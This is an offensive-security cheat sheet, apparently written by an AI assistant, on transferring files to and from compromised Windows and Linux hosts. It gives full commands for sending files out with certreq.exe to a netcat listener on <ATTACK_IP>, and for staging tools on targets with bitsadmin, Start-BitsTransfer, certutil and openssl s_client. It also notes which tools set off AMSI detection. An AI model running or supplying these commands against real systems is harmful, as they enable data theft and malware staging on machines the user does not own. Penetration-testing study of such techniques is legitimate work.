## Windows File Upload

Exfiltrating data from Windows targets when certreq.exe is present.,

### CertReq

Listener on attack host to capture file contents:

```
sudo nc -lvnp <PORT>
```

Upload local file to attack host:

```
certreq.exe -Post -config http://<ATTACK_IP>:<PORT>/ <FILE_PATH>
```

**Gotchas**

- **Missing -Post parameter** on older binary versions prevents the upload function.
- **Timeout error 0x80072ee2** may occur during the request.

---

## Linux File Download

Pulling tools to Linux targets when standard web utilities are restricted and OpenSSL is available.

### OpenSSL

1. Generate necessary certificate on attack host:

```
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

2. Bind server to port and pipe file for transfer on attack host:

```
openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < <FILE_PATH>
```

3. Connect and redirect output to local file on target:

```
openssl s_client -connect <ATTACK_IP>:<PORT> -quiet > <FILE_PATH>
```

---

## Windows File Download

Tool staging on Windows targets via BITS or certificate utilities.,

### BITS

Download via bitsadmin CLI:

```
bitsadmin /transfer <SERVICE_NAME> /priority foreground http://<ATTACK_IP>:<PORT>/<FILE_PATH> <FILE_PATH>
```

Download via PowerShell module:

```
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ATTACK_IP>:<PORT>/<FILE_PATH>" -Destination "<FILE_PATH>"
```

### Certutil

Download via certificate utility:

```
certutil.exe -verifyctl -split -f http://<ATTACK_IP>:<PORT>/<FILE_PATH>
```

**Tool comparison**

- Bitsadmin -> syntax above -> prefer when foreground/background priority management is required to minimize user impact.
- Start-BitsTransfer -> syntax above -> prefer when requiring proxy support or credential integration.
- Certutil -> syntax above -> use as the primary wget alternative available across all Windows versions.

**Gotchas**

- **AMSI detection** triggers on certutil usage and will likely block the transfer.

Would you like me to find more sources for Windows or Linux file transfer methods?